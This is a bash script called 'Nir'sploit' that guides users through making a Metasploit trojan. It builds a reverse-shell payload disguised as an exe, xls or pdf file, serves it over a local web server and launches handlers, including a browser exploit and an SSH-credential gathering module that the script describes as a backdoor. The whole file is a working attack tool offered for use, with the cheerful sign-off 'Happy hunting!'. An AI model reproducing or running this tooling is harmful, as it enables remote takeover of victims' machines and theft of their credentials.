#!/bin/bash

# pro's function 
function  PRO {
echo " I know you're the best last hack ;)"
echo
echo "Okay, first thing, write the Trojan that you truly desire."
read TROJAN
echo 
echo " What port would you like to listen on? "
read PO
echo
echo "Please write the file type that you want the Trojan to be. Example: [exe, xls, pdf]"
read TYPE
IP=$(hostname -I | awk '{print $1}')
echo
echo " Last thing, please give a cool name to the file with the file type. " 
read NAME
msfvenom -p  $TROJAN  lhost=$IP  lport=$PO -f $TYPE  -o  $NAME
echo
echo " Would you like to start the attack? [yes, no]"
read ATK
if [[ $ATK  ==  yes ]] ; then
echo
echo " Opening listener on port 8888...  "
python -m http.server 8888 &
echo 
echo " Please select a Meterpreter or other tool that you like  "
read SELECT
echo "Happy hunting!" | figlet
msfconsole -x "use $SELECT; set payload $TROJAN; set LHOST $IP ; set LPORT $PO ; run "
fi
}
# help and noob's function
function HELP_1 {
echo
echo " If you're a pro who just needs a reminder..."
echo " or a noob who's starting their journey."
echo " All of us need help sometimes."
echo
echo " Here is an example. [windows/meterpreter/reverse_tcp ]"
echo
sleep 2
echo " First thing, write the OS (operating system).  " 
read OS
echo
echo " Now, write the control that you want."
read MIDEAL
echo
echo "Now, write the console type. "
read TAIPE
echo
echo " Please choose the Trojan that you desire "
msfvenom -l payloads | grep $OS | grep $MIDEAL | grep $TAIPE | awk '{print$1}'
TEST=$(msfvenom -l payloads | grep $OS | grep $MIDEAL | grep $TAIPE | awk '{print$1}')
if [[ -z  "$TEST" ]] ; then
echo "Have you mistyped? It's okay, happens all the time. Let's restart"
sleep 4
HELP_1 
echo
fi
echo 
echo " Please write the Trojan.  "
read TROJAN
echo 
echo " What port would you like to listen on?  "
read PO
echo
echo "Please write the file type that you want the Trojan to be. Example: [exe, xls, pdf]"
read TYPE
IP=$(hostname -I | awk '{print $1}')
echo
echo " Last thing, please give a cool name to the file with the file type. " 
read NAME
msfvenom -p  $TROJAN  lhost=$IP  lport=$PO -f $TYPE  -o  $NAME
echo
echo
echo " Would you like to start the attack? [Yes, No] "
read ATK
if [[ $ATK  ==  yes ]] ; then
echo
echo " Opening listener on port 8888... "
python -m http.server 8888  &
echo
echo "Please select the exploit you desire (select the numbers 1, 2, 3)."
echo -e "
1)
                   exploit/multi/handler
used to  handle payloadsn like [ reverse_shells , Meterpreter ]

2)
                  exploit/multi/browser
this is a handler module for client-side exploits  for web browesers

3)

                 post/multi/gather/ssh_creds 
its used to maintain access to a compromiesd system [ its setting a backdoor] "
read -r SELECT

case "$SELECT" in 
1)
SELECT="exploit/multi/handler"
;;
2)
SELECT=" exploit/multi/browser/opera_historysearch" 
;;
3)
SELECT="post/multi/gather/ssh_creds"
;;
*)
echo " invalid answer "
;;
esac
echo 
echo "Happy hunting!" | figlet
msfconsole -x "use $SELECT; set payload $TROJAN; set LHOST $IP ; set LPORT $PO ; run"
fi
}

echo "Welcome to Nir'sploit"
echo 
echo  "Pros' Road" 
echo -e "
- - - - - - - - - - - - - - - - - - - - - - - - - -
Do you have a particular Trojan in mind?
If your answer is yes, you’ve come to the right place!
Just write yes in the answer bar and go ahead. 
- - - - - - - - - - - - - - - - - - - - - - - - - - 
"
echo 
echo " on the way to becoming  a pro "
echo -e "
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ahh, but if you're not that experienced, don't worry!
We've got you covered with our great tool where you can search for keywords!
What does that mean, you're asking yourself?
Well, just write "no" in the answer bar, and you'll soon find out!
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"
function PRO_P {
echo " ok we got you! "
echo
echo "Please write your Trojan. [If you don't remember or need a reminder, write "help," otherwise just press whatever you want.]"
read TRY
if [[ $TRY != "help" ]] ; then 
PRO
elif [[ $TRY == "help" ]] ; then
HELP_1
fi
}

# ho are you function
function  RESTART {
echo
echo  " so what are you  [ pro , noob ] "

read -r  ANSWER 
if [[ "$ANSWER" == "noob" ]] ; then 
HELP_1
elif [[ "$ANSWER" == "pro" ]] ; then 
PRO_P
else 
echo "Please select pro or noob."
echo "Restarting..."
sleep 3
RESTART
fi
}
RESTART
